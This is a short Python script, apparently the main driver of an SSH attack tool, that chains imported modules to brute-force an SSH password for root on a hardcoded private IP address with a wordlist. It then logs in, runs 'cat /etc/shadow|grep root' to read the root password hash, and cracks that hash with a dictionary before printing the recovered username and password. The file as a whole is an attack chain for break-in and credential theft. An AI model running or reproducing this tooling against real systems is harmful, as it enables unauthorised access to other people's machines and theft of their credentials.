#!/usr/bin/env python3
# coding=utf-8
__author__="riverchu"

import optparse

from scan import *
from brute import bruteSSH,loginSSH,bruteUnixPasswd

def brute(host,user,dictionary,*,connections):
    target=(host,user)
    dic = dict()
    dic['passwdFile']=dictionary
    dic['maxConnection']=connections

    info = bruteSSH.bruteSSH(*target,**dic)

    return info

def login(loginInfo):
    if loginInfo['type']=='password' and loginInfo['key']!=None:
        return loginSSH.start_ssh(loginInfo['host'],loginInfo['user'],loginInfo['key'])

def scan():
    pass

def main(host,user,dictionary,*,connections=10):
    info = brute(host,user,dictionary,connections=connections)
    handle = login(info)
    ret = loginSSH.send_command(handle,'cat /etc/shadow|grep root')
    passwdInfo = bruteUnixPasswd.crack_unix_passwd(ret,dic='./data/dictionary.txt')
    print('user:',passwdInfo[0])
    print('password:',passwdInfo[1])

if __name__=="__main__":
    host = '10.108.36.71'
    user = 'root'
    dictionary = './data/dictionary.txt'
    main(host,user,dictionary)
